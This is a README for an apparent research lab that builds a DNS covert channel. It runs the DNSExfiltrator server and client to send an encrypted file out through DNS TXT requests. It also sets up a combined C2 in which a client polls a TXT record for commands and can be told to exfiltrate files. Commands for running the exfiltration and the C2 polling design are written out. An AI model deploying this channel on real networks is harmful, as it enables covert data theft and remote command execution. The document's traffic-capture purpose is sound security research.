# DNSExfiltrator

The bulk of the DNS exfiltration code is from this repository.

https://github.com/Arno0x/DNSExfiltrator

For our purposes, the aim is to use the DNS exfiltrator code to capture traffic for a DNS covert channel. The current set up is to use two virutal machines - one running the Python server script and another (Windows) running the client exe.

To run the server:

```sudo python3 dnsexfiltrator.py -d [domain] -p [passowrd]```

To run the client:

```.\dnsExfiltrator.exe [file] [domain] [password] -b32 s=[server ip address]```

The server acts as a DNS server - it is not required to configure one seperately. The client side transfers the given file in the format of an ecrypted zip file to the server through DNS text record requests. Currently, their only exists a client side script for Windows.

# Combined Covert Channel

There is also supported a combined covert channel which implements exfiltration over DNS, but also a more standard C2.

The setup for this is detailed below.

- DNS bind server. All the relavent configuration files are present in this repository. Essentially, there is a normal zone for normal DNS operation (netres.com), another zone for C2 operation (c2.netres.com) with edit permissions enabled, and a forward zone to be used for data exfiltration (exfil.netres.com).  

- Client side script. Use ```python covert_dns.py``` to start the client side script. This script continually polls the server at the message.c2.netres.com domain endpoint for new commands to run.

- The server side script. Continually asks the user for commands to issue to the client. Commands are issued to the client by updating the message.c2.netres.com text record. The server updates the record for ten seconds giving the client enough time to read the command, and then resets the record to be empty.

- The exfiltration command can be also be given from the server script with ```exfiltrate [file name]```. This will cause the client to run the dnsExfiltrator.exe program, which makes a request to exfil.netres.com. 

- The server side exfiltration script also needs to be running with ```sudo python3 dnsexfiltrator.py -d exfil.netres.com -p password```. In the combined covert channel, exfiltration works by having the main bind server forward all requests to the exfil.netres.com zone to this script, which is running its own DNS server on 127.0.0.1:53535. This allows us to have a normal BIND server for other purposes, while also running the custom DNS server to serve the exfiltration commands.

## Added Details

In order to function, the C2 server side python scripts needs to be able to edit the message.c2.netres.com text record. If you are trying to set this up yourself and getting a ```SERVFAIL```, check ```journalctl -xe``` for the error. It might be that BIND does not have permissions in the zone directory to create the db.c2.netres.com.jnl file, which it needs in order to edit the DNS records.

Additionally, currently there is no way for the client to send updates back to the server (i.e. command run successfully or simple command output). This is a work in progress. To properly read commands, the the client and server both operate on 10 seconds sleep timers. The server puts its command into the message.c2.netres.com text record for only 10 seconds before clearing it. Conversely, the client reads from this text record once every 10 seconds. This allows semi-reliable communcation of the commands without full two-way communication.

